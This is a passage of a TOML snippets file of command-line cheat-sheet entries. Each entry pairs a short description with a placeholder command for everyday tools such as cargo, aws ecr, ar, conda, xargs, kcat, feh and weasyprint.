  description = "Compile, but don’t run benchmarks"
  command = "cargo bench --no-run"
  output = ""

[[snippets]]
  description = "Benchmark the specified benchmark"
  command = "cargo bench --bench <benchmark>"
  output = ""

[[snippets]]
  description = "Benchmark with the given profile (default: `bench`)"
  command = "cargo bench --profile <profile>"
  output = ""

[[snippets]]
  description = "Benchmark all example targets"
  command = "cargo bench --examples"
  output = ""

[[snippets]]
  description = "Benchmark all binary targets"
  command = "cargo bench --bins"
  output = ""

[[snippets]]
  description = "Benchmark the package’s library"
  command = "cargo bench --lib"
  output = ""

[[snippets]]
  description = "Set a specific login shell for the current user interactively"
  command = "chsh"
  output = ""

[[snippets]]
  description = "Set a specific login [s]hell for the current user"
  command = "chsh -s <path/to/shell>"
  output = ""

[[snippets]]
  description = "Set a login [s]hell for a specific user"
  command = "chsh -s <path/to/shell> <username>"
  output = ""

[[snippets]]
  description = "Authenticate Docker with the default registry (username is AWS)"
  command = "aws ecr get-login-password --region <region> | <docker login> --username AWS --password-stdin <aws_account_id>.dkr.ecr.<region>.amazonaws.com"
  output = ""

[[snippets]]
  description = "Create a repository"
  command = "aws ecr create-repository --repository-name <repository> --image-scanning-configuration scanOnPush=<true|false> --region <region>"
  output = ""

[[snippets]]
  description = "Tag a local image for ECR"
  command = "docker tag <container_name>:<tag> <aws_account_id>.dkr.ecr.<region>.amazonaws.com/<container_name>:<tag>"
  output = ""

[[snippets]]
  description = "Push an image to a repository"
  command = "docker push <aws_account_id>.dkr.ecr.<region>.amazonaws.com/<container_name>:<tag>"
  output = ""

[[snippets]]
  description = "Pull an image from a repository"
  command = "docker pull <aws_account_id>.dkr.ecr.<region>.amazonaws.com/<container_name>:<tag>"
  output = ""

[[snippets]]
  description = "Delete an image from a repository"
  command = "aws ecr batch-delete-image --repository-name <repository> --image-ids imageTag=<latest>"
  output = ""

[[snippets]]
  description = "Delete a repository"
  command = "aws ecr delete-repository --repository-name <repository> --force"
  output = ""

[[snippets]]
  description = "List images within a repository"
  command = "aws ecr list-images --repository-name <repository>"
  output = ""

[[snippets]]
  description = "E[x]tract all members from an archive"
  command = "ar x <path/to/file.a>"
  output = ""

[[snippets]]
  description = "Lis[t] contents in a specific archive"
  command = "ar t <path/to/file.ar>"
  output = ""

[[snippets]]
  description = "[r]eplace or add specific files to an archive"
  command = "ar r <path/to/file.deb> <path/to/debian-binary path/to/control.tar.gz path/to/data.tar.xz ...>"
  output = ""

[[snippets]]
  description = "In[s]ert an object file index (equivalent to using `ranlib`)"
  command = "ar s <path/to/file.a>"
  output = ""

[[snippets]]
  description = "Create an archive with specific files and an accompanying object file index"
  command = "ar rs <path/to/file.a> <path/to/file1.o path/to/file2.o ...>"
  output = ""

[[snippets]]
  description = "Start Sails"
  command = "sails lift"
  output = ""

[[snippets]]
  description = "Create new Sails project"
  command = "sails new <projectName>"
  output = ""

[[snippets]]
  description = "Generate Sails API"
  command = "sails generate <name>"
  output = ""

[[snippets]]
  description = "Generate Sails Controller"
  command = "sails generate controller <name>"
  output = ""

[[snippets]]
  description = "Generate Sails Model"
  command = "sails generate model <name>"
  output = ""

[[snippets]]
  description = "Display a cuddly teddy bear on your X desktop"
  command = "xteddy"
  output = ""

[[snippets]]
  description = "Use the window manager to display the teddy bear and ignore the "quit" (`q`) command"
  command = "xteddy -wm -noquit"
  output = ""

[[snippets]]
  description = "Make the teddy bear stay on top of all other windows"
  command = "xteddy -float"
  output = ""

[[snippets]]
  description = "Display another image [F]ile instead of the cuddly teddy bear"
  command = "xteddy -F <path/to/image>"
  output = ""

[[snippets]]
  description = "Set the initial location of the teddy bear (`width` and `height` are ignored)"
  command = "xteddy -geometry <width>x<height>+<x>+<y>"
  output = ""

[[snippets]]
  description = "Launch VLC in a container"
  command = "x11docker --pulseaudio --share=<$HOME/Videos> <jess/vlc>"
  output = ""

[[snippets]]
  description = "Launch Xfce in a window"
  command = "x11docker --desktop <x11docker/xfce>"
  output = ""

[[snippets]]
  description = "Launch GNOME in a window"
  command = "x11docker --desktop --gpu --init=<systemd> <x11docker/gnome>"
  output = ""

[[snippets]]
  description = "Launch KDE Plasma in a window"
  command = "x11docker --desktop --gpu --init=<systemd> <x11docker/kde-plasma>"
  output = ""

[[snippets]]
  description = "Display help"
  command = "x11docker --help"
  output = ""

[[snippets]]
  description = "Compile a 'package main' file (output will be the filename without extension)"
  command = "go build <path/to/main.go>"
  output = ""

[[snippets]]
  description = "Compile, specifying the output filename"
  command = "go build -o <path/to/binary> <path/to/source.go>"
  output = ""

[[snippets]]
  description = "Compile a package"
  command = "go build -o <path/to/binary> <path/to/package>"
  output = ""

[[snippets]]
  description = "Compile a main package into an executable, enabling data race detection"
  command = "go build -race -o <path/to/executable> <path/to/main/package>"
  output = ""

[[snippets]]
  description = "Execute an Amass subcommand"
  command = "amass <subcommand>"
  output = ""

[[snippets]]
  description = "Display help"
  command = "amass -help"
  output = ""

[[snippets]]
  description = "Display help on an Amass subcommand (like `intel`, `enum`, etc.)"
  command = "amass -help <subcommand>"
  output = ""

[[snippets]]
  description = "Display version"
  command = "amass -version"
  output = ""

[[snippets]]
  description = "Create a new environment named `py39`, and install Python 3.9 and NumPy v1.11 or above in it"
  command = "conda create --yes --name <py39> python=<3.9> ""<numpy>=1.11>"""
  output = ""

[[snippets]]
  description = "Make exact copy of an environment"
  command = "conda create --clone <py39> --name <py39-copy>"
  output = ""

[[snippets]]
  description = "Create a new environment with a specified name and install a given package"
  command = "conda create --name <env_name> <package>"
  output = ""

[[snippets]]
  description = "Compile a PDF document"
  command = "pdftex <source.tex>"
  output = ""

[[snippets]]
  description = "Compile a PDF document, specifying an output directory"
  command = "pdftex -output-directory=<path/to/directory> <source.tex>"
  output = ""

[[snippets]]
  description = "Compile a PDF document, exiting on each error"
  command = "pdftex -halt-on-error <source.tex>"
  output = ""

[[snippets]]
  description = "Display all settings for the current terminal"
  command = "stty --all"
  output = ""

[[snippets]]
  description = "Set the number of rows or columns"
  command = "stty <rows|cols> <count>"
  output = ""

[[snippets]]
  description = "Get the actual transfer speed of a device"
  command = "stty --file <path/to/device_file> speed"
  output = ""

[[snippets]]
  description = "Reset all modes to reasonable values for the current terminal"
  command = "stty sane"
  output = ""

[[snippets]]
  description = "Print a summary for an image (width, height, and color depth)"
  command = "pngcheck <image.png>"
  output = ""

[[snippets]]
  description = "Print information for an image with [c]olorized output"
  command = "pngcheck -c <image.png>"
  output = ""

[[snippets]]
  description = "Print [v]erbose information for an image"
  command = "pngcheck -cvt <image.png>"
  output = ""

[[snippets]]
  description = "Receive an image from `stdin` and display detailed information"
  command = "cat <path/to/image.png> | pngcheck -cvt"
  output = ""

[[snippets]]
  description = "[s]earch for PNGs within a specific file and display information about them"
  command = "pngcheck -s <image.png>"
  output = ""

[[snippets]]
  description = "Search for PNGs within another file and e[x]tract them"
  command = "pngcheck -x <image.png>"
  output = ""

[[snippets]]
  description = "Convert a Slim file to HTML"
  command = "slimrb <input.slim> <output.html>"
  output = ""

[[snippets]]
  description = "Convert a Slim file and output to prettified HTML"
  command = "slimrb --pretty <input.slim> <output.html>"
  output = ""

[[snippets]]
  description = "Convert a Slim file to ERB"
  command = "slimrb --erb <input.slim> <output.erb>"
  output = ""

[[snippets]]
  description = "Open a new file in JOE"
  command = "joe"
  output = ""

[[snippets]]
  description = "Open a specific file"
  command = "joe <path/to/file>"
  output = ""

[[snippets]]
  description = "Open a specific file, positioning the cursor at the specified line"
  command = "joe +<line> <path/to/file>"
  output = ""

[[snippets]]
  description = "Open a specific file in read-only mode"
  command = "joe -rdonly <path/to/file>"
  output = ""

[[snippets]]
  description = "Upscale an image"
  command = "waifu2x-ncnn-vulkan -i <path/to/input_file> -o <path/to/output_file>"
  output = ""

[[snippets]]
  description = "Upscale an image by a custom scale factor and denoise it"
  command = "waifu2x-ncnn-vulkan -i <path/to/input_file> -o <path/to/output_file> -s <1|2|4|8|16|32> -n <-1|0|1|2|3>"
  output = ""

[[snippets]]
  description = "Save the upscaled image in a specific format"
  command = "waifu2x-ncnn-vulkan -i <path/to/input_file> -o <path/to/output_file> -f <jpg|png|webp>"
  output = ""

[[snippets]]
  description = "List all available voices"
  command = "flite -lv"
  output = ""

[[snippets]]
  description = "Convert a text string to speech"
  command = "flite -t ""<string>"""
  output = ""

[[snippets]]
  description = "Convert the contents of a file to speech"
  command = "flite -f <path/to/file.txt>"
  output = ""

[[snippets]]
  description = "Use the specified voice"
  command = "flite -voice <file://path/to/filename.flitevox|url>"
  output = ""

[[snippets]]
  description = "Store output into a wav file"
  command = "flite -voice <file://path/to/filename.flitevox|url> -f <path/to/file.txt> -o <output.wav>"
  output = ""

[[snippets]]
  description = "Display version"
  command = "flite --version"
  output = ""

[[snippets]]
  description = "Render an image directly in the terminal"
  command = "chafa <path/to/file>"
  output = ""

[[snippets]]
  description = "Render an image with 24-bit [c]olor"
  command = "chafa -c full <path/to/file>"
  output = ""

[[snippets]]
  description = "Improve image rendering with small color palettes using dithering"
  command = "chafa -c 16 --dither ordered <path/to/file>"
  output = ""

[[snippets]]
  description = "Render an image, making it appear pixelated"
  command = "chafa --symbols vhalf <path/to/file>"
  output = ""

[[snippets]]
  description = "Render a monochrome image with only braille characters"
  command = "chafa -c none --symbols braille <path/to/file>"
  output = ""

[[snippets]]
  description = "Display the status"
  command = "dolt status"
  output = ""

[[snippets]]
  description = "Load-test "example.com" with web interface using locustfile.py"
  command = "locust --host=<http://example.com>"
  output = ""

[[snippets]]
  description = "Use a different test file"
  command = "locust --locustfile=<test_file.py> --host=<http://example.com>"
  output = ""

[[snippets]]
  description = "Run test without web interface, spawning 1 user a second until there are 100 users"
  command = "locust --no-web --clients=<100> --hatch-rate=<1> --host=<http://example.com>"
  output = ""

[[snippets]]
  description = "Start Locust in master mode"
  command = "locust --master --host=<http://example.com>"
  output = ""

[[snippets]]
  description = "Connect Locust slave to master"
  command = "locust --slave --host=<http://example.com>"
  output = ""

[[snippets]]
  description = "Connect Locust slave to master on a different machine"
  command = "locust --slave --master-host=<master_hostname> --host=<http://example.com>"
  output = ""

[[snippets]]
  description = "Connect to a server"
  command = "openconnect <vpn.example.org>"
  output = ""

[[snippets]]
  description = "Connect to a server, forking into the background"
  command = "openconnect --background <vpn.example.org>"
  output = ""

[[snippets]]
  description = "Terminate the connection that is running in the background"
  command = "killall -SIGINT openconnect"
  output = ""

[[snippets]]
  description = "Connect to a server, reading options from a configuration file"
  command = "openconnect --config=<path/to/file> <vpn.example.org>"
  output = ""

[[snippets]]
  description = "Connect to a server and authenticate with a specific SSL client certificate"
  command = "openconnect --certificate=<path/to/file> <vpn.example.org>"
  output = ""

[[snippets]]
  description = "Output the traceroute of `warts` files one after the other in an easy-to-parse format"
  command = "sc_analysis_dump <path/to/file1.warts path/to/file2.warts ...>"
  output = ""

[[snippets]]
  description = "Run a command using the input data as arguments"
  command = "<arguments_source> | xargs <command>"
  output = ""

[[snippets]]
  description = "Run multiple chained commands on the input data"
  command = "<arguments_source> | xargs sh -c ""<command1> && <command2> | <command3>"""
  output = ""

[[snippets]]
  description = "Delete all files with a `.backup` extension (`-print0` uses a null character to split file names, and `-0` uses it as delimiter)"
  command = "find . -name <'*.backup'> -print0 | xargs -0 rm -v"
  output = ""

[[snippets]]
  description = "Execute the command once for each input line, replacing any occurrences of the placeholder (here marked as `_`) with the input line"
  command = "<arguments_source> | xargs -I _ <command> _ <optional_extra_arguments>"
  output = ""

[[snippets]]
  description = "Parallel runs of up to `max-procs` processes at a time; the default is 1. If `max-procs` is 0, xargs will run as many processes as possible at a time"
  command = "<arguments_source> | xargs -P <max-procs> <command>"
  output = ""

[[snippets]]
  description = "Request device capabilities"
  command = "gnmic --address <ip:port> capabilities"
  output = ""

[[snippets]]
  description = "Provide a username and password to fetch device capabilities"
  command = "gnmic --address <ip:port> --username <username> --password <password> capabilities"
  output = ""

[[snippets]]
  description = "Get a snapshot of the device state at a specific path"
  command = "gnmic -a <ip:port> get --path <path>"
  output = ""

[[snippets]]
  description = "Update device state at a specific path"
  command = "gnmic -a <ip:port> set --update-path <path> --update-value <value>"
  output = ""

[[snippets]]
  description = "Subscribe to target state updates under the subtree at a specific path"
  command = "gnmic -a <ip:port> subscribe --path <path>"
  output = ""

[[snippets]]
  description = "Generate TOTP token (behaves like Google Authenticator)"
  command = "oathtool --totp --base32 ""<secret>"""
  output = ""

[[snippets]]
  description = "Generate a TOTP token for a specific time"
  command = "oathtool --totp --now ""<2004-02-29 16:21:42>"" --base32 ""<secret>"""
  output = ""

[[snippets]]
  description = "Validate a TOTP token"
  command = "oathtool --totp --base32 ""<secret>"" ""<token>"""
  output = ""

[[snippets]]
  description = "Initialize an unconfigured repository"
  command = "transcrypt"
  output = ""

[[snippets]]
  description = "List the currently encrypted files"
  command = "git ls-crypt"
  output = ""

[[snippets]]
  description = "Display the credentials of a configured repository"
  command = "transcrypt --display"
  output = ""

[[snippets]]
  description = "Initialize and decrypt a fresh clone of a configured repository"
  command = "transcrypt --cipher=<cipher>"
  output = ""

[[snippets]]
  description = "Rekey to change the encryption cipher or password"
  command = "transcrypt --rekey"
  output = ""

[[snippets]]
  description = "Get ephemerides for Paris, France"
  command = "kosmorro --latitude=<48.7996> --longitude=<2.3511>"
  output = ""

[[snippets]]
  description = "Get ephemerides for Paris, France, in the UTC+2 timezone"
  command = "kosmorro --latitude=<48.7996> --longitude=<2.3511> --timezone=<2>"
  output = ""

[[snippets]]
  description = "Get ephemerides for Paris, France, on June 9th, 2020"
  command = "kosmorro --latitude=<48.7996> --longitude=<2.3511> --date=<2020-06-09>"
  output = ""

[[snippets]]
  description = "Generate a PDF (Note: TeXLive must be installed)"
  command = "kosmorro --format=<pdf> --output=<path/to/file.pdf>"
  output = ""

[[snippets]]
  description = "List releases in a Gitlab repository, limited to 30 items"
  command = "glab release list"
  output = ""

[[snippets]]
  description = "Display information about a specific release"
  command = "glab release view <tag>"
  output = ""

[[snippets]]
  description = "Create a new release"
  command = "glab release create <tag>"
  output = ""

[[snippets]]
  description = "Delete a specific release"
  command = "glab release delete <tag>"
  output = ""

[[snippets]]
  description = "Download assets from a specific release"
  command = "glab release download <tag>"
  output = ""

[[snippets]]
  description = "Upload assets to a specific release"
  command = "glab release upload <tag> <path/to/file1 path/to/file2 ...>"
  output = ""

[[snippets]]
  description = "Display the currently logged in user's name"
  command = "logname"
  output = ""

[[snippets]]
  description = "Analyze a directory and print the result"
  command = "phploc <path/to/directory>"
  output = ""

[[snippets]]
  description = "Include only specific files from a comma-separated list (globs are allowed)"
  command = "phploc <path/to/directory> --names '<path/to/file1,path/to/file2,...>'"
  output = ""

[[snippets]]
  description = "Exclude specific files from a comma-separated list (globs are allowed)"
  command = "phploc <path/to/directory> --names-exclude '<path/to/file1,path/to/file2,...>'"
  output = ""

[[snippets]]
  description = "Exclude a specific directory from analysis"
  command = "phploc <path/to/directory> --exclude <path/to/exclude_directory>"
  output = ""

[[snippets]]
  description = "Log the results to a specific CSV file"
  command = "phploc <path/to/directory> --log-csv <path/to/file>"
  output = ""

[[snippets]]
  description = "Log the results to a specific XML file"
  command = "phploc <path/to/directory> --log-xml <path/to/file>"
  output = ""

[[snippets]]
  description = "Count PHPUnit test case classes and test methods"
  command = "phploc <path/to/directory> --count-tests"
  output = ""

[[snippets]]
  description = "Display file using default settings: octal format, 8 bytes per line, byte offsets in octal, and duplicate lines replaced with `*`"
  command = "od <path/to/file>"
  output = ""

[[snippets]]
  description = "Display file in verbose mode, i.e. without replacing duplicate lines with `*`"
  command = "od -v <path/to/file>"
  output = ""

[[snippets]]
  description = "Display file in hexadecimal format (2-byte units), with byte offsets in decimal format"
  command = "od --format=<x> --address-radix=<d> -v <path/to/file>"
  output = ""

[[snippets]]
  description = "Display file in hexadecimal format (1-byte units), and 4 bytes per line"
  command = "od --format=<x1> --width=<4> -v <path/to/file>"
  output = ""

[[snippets]]
  description = "Display file in hexadecimal format along with its character representation, and do not print byte offsets"
  command = "od --format=<xz> --address-radix=<n> -v <path/to/file>"
  output = ""

[[snippets]]
  description = "Read only 100 bytes of a file starting from the 500th byte"
  command = "od --read-bytes <100> --skip-bytes=<500> -v <path/to/file>"
  output = ""

[[snippets]]
  description = "Consume messages starting with the newest offset"
  command = "kcat -C -t <topic> -b <brokers>"
  output = ""

[[snippets]]
  description = "Consume messages starting with the oldest offset and exit after the last message is received"
  command = "kcat -C -t <topic> -b <brokers> -o beginning -e"
  output = ""

[[snippets]]
  description = "Consume messages as a Kafka consumer group"
  command = "kcat -G <group_id> <topic> -b <brokers>"
  output = ""

[[snippets]]
  description = "Publish message by reading from `stdin`"
  command = "echo <message> | kcat -P -t <topic> -b <brokers>"
  output = ""

[[snippets]]
  description = "Publish messages by reading from a file"
  command = "kcat -P -t <topic> -b <brokers> <path/to/file>"
  output = ""

[[snippets]]
  description = "List metadata for all topics and brokers"
  command = "kcat -L -b <brokers>"
  output = ""

[[snippets]]
  description = "List metadata for a specific topic"
  command = "kcat -L -t <topic> -b <brokers>"
  output = ""

[[snippets]]
  description = "Get offset for a topic/partition for a specific point in time"
  command = "kcat -Q -t <topic>:<partition>:<unix_timestamp> -b <brokers>"
  output = ""

[[snippets]]
  description = "Reduce the specified image by the specified factor"
  command = "pbmreduce <N> <path/to/image.pbm> > <path/to/output.pbm>"
  output = ""

[[snippets]]
  description = "Use simple thresholding when reducing"
  command = "pbmreduce -threshold <N> <path/to/image.pbm> > <path/to/output.pbm>"
  output = ""

[[snippets]]
  description = "Use the specified threshold for all quantizations"
  command = "pbmreduce -value <0.6> <N> <path/to/image.pbm> > <path/to/output.pbm>"
  output = ""

[[snippets]]
  description = "Show status of all jobs"
  command = "jobs"
  output = ""

[[snippets]]
  description = "Show status of a particular job"
  command = "jobs %<job_id>"
  output = ""

[[snippets]]
  description = "Show status and process IDs of all jobs"
  command = "jobs -l"
  output = ""

[[snippets]]
  description = "Show process IDs of all jobs"
  command = "jobs -p"
  output = ""

[[snippets]]
  description = "Launch document viewer"
  command = "okular"
  output = ""

[[snippets]]
  description = "Open specific documents"
  command = "okular <path/to/file1 path/to/file2 ...>"
  output = ""

[[snippets]]
  description = "Open a document at a specific page"
  command = "okular --page <page_number> <path/to/file>"
  output = ""

[[snippets]]
  description = "Open a specific document in presentation mode"
  command = "okular --presentation <path/to/file>"
  output = ""

[[snippets]]
  description = "Open a specific document and start a print dialog"
  command = "okular --print <path/to/file>"
  output = ""

[[snippets]]
  description = "Open a document and search for a specific string"
  command = "okular --find <search_string> <path/to/file>"
  output = ""

[[snippets]]
  description = "List startable tasks"
  command = "todo list --startable"
  output = ""

[[snippets]]
  description = "Add a new task to the work list"
  command = "todo new <thing_to_do> --list <work>"
  output = ""

[[snippets]]
  description = "Add a location to a task with a given ID"
  command = "todo edit --location <location_name> <task_id>"
  output = ""

[[snippets]]
  description = "Show details about a task"
  command = "todo show <task_id>"
  output = ""

[[snippets]]
  description = "Mark tasks with the specified IDs as completed"
  command = "todo done <task_id1 task_id2 ...>"
  output = ""

[[snippets]]
  description = "Delete a task"
  command = "todo delete <task_id>"
  output = ""

[[snippets]]
  description = "Delete done tasks and reset the IDs of the remaining tasks"
  command = "todo flush"
  output = ""

[[snippets]]
  description = "Create a skeleton `shard.yml` file"
  command = "shards init"
  output = ""

[[snippets]]
  description = "Install dependencies from a `shard.yml` file"
  command = "shards install"
  output = ""

[[snippets]]
  description = "Update all dependencies"
  command = "shards update"
  output = ""

[[snippets]]
  description = "List all installed dependencies"
  command = "shards list"
  output = ""

[[snippets]]
  description = "Display version of dependency"
  command = "shards version <path/to/dependency_directory>"
  output = ""

[[snippets]]
  description = "Create a new Angular application inside a directory"
  command = "ng new <project_name>"
  output = ""

[[snippets]]
  description = "Add a new component to one's application"
  command = "ng generate component <component_name>"
  output = ""

[[snippets]]
  description = "Add a new class to one's application"
  command = "ng generate class <class_name>"
  output = ""

[[snippets]]
  description = "Add a new directive to one's application"
  command = "ng generate directive <directive_name>"
  output = ""

[[snippets]]
  description = "Run the application with the following command in its root directory"
  command = "ng serve"
  output = ""

[[snippets]]
  description = "Build the application"
  command = "ng build"
  output = ""

[[snippets]]
  description = "Run unit tests"
  command = "ng test"
  output = ""

[[snippets]]
  description = "Display the version of your current Angular installation"
  command = "ng version"
  output = ""

[[snippets]]
  description = "Calculate the SHA224 checksum for one or more files"
  command = "sha224sum <path/to/file1 path/to/file2 ...>"
  output = ""

[[snippets]]
  description = "Calculate and save the list of SHA224 checksums to a file"
  command = "sha224sum <path/to/file1 path/to/file2 ...> > <path/to/file.sha224>"
  output = ""

[[snippets]]
  description = "Calculate a SHA224 checksum from `stdin`"
  command = "<command> | sha224sum"
  output = ""

[[snippets]]
  description = "Read a file of SHA224 sums and filenames and verify all files have matching checksums"
  command = "sha224sum --check <path/to/file.sha224>"
  output = ""

[[snippets]]
  description = "Only show a message for missing files or when verification fails"
  command = "sha224sum --check --quiet <path/to/file.sha224>"
  output = ""

[[snippets]]
  description = "Only show a message when verification fails, ignoring missing files"
  command = "sha224sum --ignore-missing --check --quiet <path/to/file.sha224>"
  output = ""

[[snippets]]
  description = "Display the serialVersionUID of a class"
  command = "serialver <classnames>"
  output = ""

[[snippets]]
  description = "Display the serialVersionUID for a colon-separated list of classes and resources"
  command = "serialver -classpath <path/to/directory> <classname1:classname2:...>"
  output = ""

[[snippets]]
  description = "Use a specific option from reference page of Java application launcher to the Java Virtual Machine"
  command = "serialver -Joption <classnames>"
  output = ""

[[snippets]]
  description = "Replace the colors in an image with those in the specified color palette"
  command = "pnmremap -mapfile <path/to/palette_file.ppm> <path/to/input.pnm> > <path/to/output.pnm>"
  output = ""

[[snippets]]
  description = "Use Floyd-Steinberg dithering for representing colors missing in the color palette"
  command = "pnmremap -mapfile <path/to/palette_file.ppm> -floyd <path/to/input.pnm> > <path/to/output.pnm>"
  output = ""

[[snippets]]
  description = "Use the first color in the palette for representing colors missing in the color palette"
  command = "pnmremap -mapfile <path/to/palette_file.ppm> -firstisdefault <path/to/input.pnm> > <path/to/output.pnm>"
  output = ""

[[snippets]]
  description = "Use the specified color for representing colors missing in the color palette"
  command = "pnmremap -mapfile <path/to/palette_file.ppm> -missingcolor <color> <path/to/input.pnm> > <path/to/output.pnm>"
  output = ""

[[snippets]]
  description = "View images locally or using a URL"
  command = "feh <path/to/images>"
  output = ""

[[snippets]]
  description = "View images recursively"
  command = "feh --recursive <path/to/images>"
  output = ""

[[snippets]]
  description = "View images without window borders"
  command = "feh --borderless <path/to/images>"
  output = ""

[[snippets]]
  description = "Exit after the last image"
  command = "feh --cycle-once <path/to/images>"
  output = ""

[[snippets]]
  description = "Use a specific slideshow cycle delay"
  command = "feh --slideshow-delay <seconds> <path/to/images>"
  output = ""

[[snippets]]
  description = "Use a specific wallpaper mode (centered, filled, maximized, scaled or tiled)"
  command = "feh --bg-<center|fill|max|scale|tile> <path/to/image>"
  output = ""

[[snippets]]
  description = "Create a montage of all images within a directory, outputting as a new image"
  command = "feh --montage --thumb-height <150> --thumb-width <150> --index-info ""<%nn%wx%h>"" --output <path/to/montage_image.png>"
  output = ""

[[snippets]]
  description = "Display system information"
  command = "rfetch"
  output = ""

[[snippets]]
  description = "Display system [a]rchitecture"
  command = "rfetch -a"
  output = ""

[[snippets]]
  description = "Display system up[t]ime"
  command = "rfetch -t"
  output = ""

[[snippets]]
  description = "Display system [k]ernel"
  command = "rfetch -k"
  output = ""

[[snippets]]
  description = "Display system [c]PU"
  command = "rfetch -c"
  output = ""

[[snippets]]
  description = "Display Linux [D]istro"
  command = "rfetch -D"
  output = ""

[[snippets]]
  description = "View [d]esktop environment"
  command = "rfetch -d"
  output = ""

[[snippets]]
  description = "View documentation for the original command"
  command = "tldr zstd"
  output = ""

[[snippets]]
  description = "Specify a configuration [d]irectory"
  command = "clash -d <path/to/directory>"
  output = ""

[[snippets]]
  description = "Specify a configuration [f]ile"
  command = "clash -f <path/to/configuration_file>"
  output = ""

[[snippets]]
  description = "Produce a request summarizing the changes between the v1.1 release and a specified branch"
  command = "git request-pull <v1.1> <https://example.com/project> <branch_name>"
  output = ""

[[snippets]]
  description = "Produce a request summarizing the changes between the v0.1 release on the `foo` branch and the local `bar` branch"
  command = "git request-pull <v0.1> <https://example.com/project> <foo:bar>"
  output = ""

[[snippets]]
  description = "Convert the specified PGM image to Lisp Machine format"
  command = "pgmtolispm <path/to/input.pgm> > <path/to/output.lispm>"
  output = ""

[[snippets]]
  description = "Browse for VNC servers"
  command = "bvnc"
  output = ""

[[snippets]]
  description = "Browse for SSH servers"
  command = "bvnc --ssh"
  output = ""

[[snippets]]
  description = "Browse for both VNC and SSH servers"
  command = "bvnc --shell"
  output = ""

[[snippets]]
  description = "Browse for VNC servers in a specified domain"
  command = "bvnc --domain=<domain>"
  output = ""

[[snippets]]
  description = "Open a file"
  command = "ex <path/to/file>"
  output = ""

[[snippets]]
  description = "Save and Quit"
  command = "wq<Enter>"
  output = ""

[[snippets]]
  description = "Undo the last operation"
  command = "undo<Enter>"
  output = ""

[[snippets]]
  description = "Search for a pattern in the file"
  command = "/<search_pattern><Enter>"
  output = ""

[[snippets]]
  description = "Perform a regular expression substitution in the whole file"
  command = "%s/<regular_expression>/<replacement>/g<Enter>"
  output = ""

[[snippets]]
  description = "Insert text"
  command = "i<Enter><text><C-c>"
  output = ""

[[snippets]]
  description = "Switch to Vim"
  command = "visual<Enter>"
  output = ""

[[snippets]]
  description = "Create a new Cognito user pool"
  command = "aws cognito-idp create-user-pool --pool-name <name>"
  output = ""

[[snippets]]
  description = "List all user pools"
  command = "aws cognito-idp list-user-pools --max-results <10>"
  output = ""

[[snippets]]
  description = "Delete a specific user pool"
  command = "aws cognito-idp delete-user-pool --user-pool-id <user_pool_id>"
  output = ""

[[snippets]]
  description = "Create a user in a specific pool"
  command = "aws cognito-idp admin-create-user --username <username> --user-pool-id <user_pool_id>"
  output = ""

[[snippets]]
  description = "List the users of a specific pool"
  command = "aws cognito-idp list-users --user-pool-id <user_pool_id>"
  output = ""

[[snippets]]
  description = "Delete a user from a specific pool"
  command = "aws cognito-idp admin-delete-user --username <username> --user-pool-id <user_pool_id>"
  output = ""

[[snippets]]
  description = "Add borders of the specified sizes to the image"
  command = "pnmpad -left <100> -right <150> -top <123> -bottom <456> <path/to/image.pnm> > <path/to/output.pnm>"
  output = ""

[[snippets]]
  description = "Pad the image to the specified size"
  command = "pnmpad -width <1000> -height <500> <path/to/image.pnm> > <path/to/output.pnm>"
  output = ""

[[snippets]]
  description = "Pad the width of the image to the specified size, controlling the ratio between right and left padding"
  command = "pnmpad -width <1000> -halign <0.7> <path/to/image.pnm> > <path/to/output.pnm>"
  output = ""

[[snippets]]
  description = "Pad the width of the image using the specified color"
  command = "pnmpad -width <1000> -color <red> <path/to/image.pnm> > <path/to/output.pnm>"
  output = ""

[[snippets]]
  description = "Recursively search for a pattern in the current working directory"
  command = "rgrep ""<search_pattern>"""
  output = ""

[[snippets]]
  description = "Recursively search for a case-insensitive pattern in the current working directory"
  command = "rgrep --ignore-case ""<search_pattern>"""
  output = ""

[[snippets]]
  description = "Recursively search for an extended regular expression pattern (supports `?`, `+`, `{}`, `()` and `|`) in the current working directory"
  command = "rgrep --extended-regexp ""<search_pattern>"""
  output = ""

[[snippets]]
  description = "Recursively search for an exact string (disables regular expressions) in the current working directory"
  command = "rgrep --fixed-strings ""<exact_string>"""
  output = ""

[[snippets]]
  description = "Recursively search for a pattern in a specified directory (or file)"
  command = "rgrep ""<search_pattern>"" <path/to/file_or_directory>"
  output = ""

[[snippets]]
  description = "Check if the configuration files are valid or not (if present report errors)"
  command = "promtool check config <config_file.yml>"
  output = ""

[[snippets]]
  description = "Check if the rule files are valid or not (if present report errors)"
  command = "promtool check rules <rules_file.yml>"
  output = ""

[[snippets]]
  description = "Pass Prometheus metrics over `stdin` to check them for consistency and correctness"
  command = "curl --silent <http://example.com:9090/metrics/> | promtool check metrics"
  output = ""

[[snippets]]
  description = "Unit tests for rules config"
  command = "promtool test rules <test_file.yml>"
  output = ""

[[snippets]]
  description = "Format a file, overwriting the original file in-place"
  command = "rustfmt <path/to/source.rs>"
  output = ""

[[snippets]]
  description = "Check a file for formatting and display any changes on the console"
  command = "rustfmt --check <path/to/source.rs>"
  output = ""

[[snippets]]
  description = "Backup any modified files before formatting (the original file is renamed with a `.bk` extension)"
  command = "rustfmt --backup <path/to/source.rs>"
  output = ""

[[snippets]]
  description = "Output lines that are in both specified files"
  command = "combine <path/to/file1> and <path/to/file2>"
  output = ""

[[snippets]]
  description = "Output lines that are in the first but not in the second file"
  command = "combine <path/to/file1> not <path/to/file2>"
  output = ""

[[snippets]]
  description = "Output lines that in are in either of the specified files"
  command = "combine <path/to/file1> or <path/to/file2>"
  output = ""

[[snippets]]
  description = "Output lines that are in exactly one of the specified files"
  command = "combine <path/to/file1> xor <path/to/file2>"
  output = ""

[[snippets]]
  description = "Render an HTML file to PDF"
  command = "weasyprint <path/to/input.html> <path/to/output.pdf>"
  output = ""

[[snippets]]
  description = "Render an HTML file to PNG, including an additional user stylesheet"
  command = "weasyprint <path/to/input.html> <path/to/output.png> --stylesheet <path/to/stylesheet.css>"
  output = ""

[[snippets]]
  description = "Output additional debugging information when rendering"
  command = "weasyprint <path/to/input.html> <path/to/output.pdf> --verbose"
  output = ""

[[snippets]]
  description = "Specify a custom resolution when outputting to PNG"
  command = "weasyprint <path/to/input.html> <path/to/output.png> --resolution <300>"
  output = ""

[[snippets]]
  description = "Specify a base URL for relative URLs in the input HTML file"
  command = "weasyprint <path/to/input.html> <path/to/output.png> --base-url <url_or_filename>"
  output = ""

[[snippets]]
  description = "Create a new feed database that sends email to an email address"
  command = "r2e new <email_address>"
  output = ""

[[snippets]]
  description = "Subscribe to a feed"
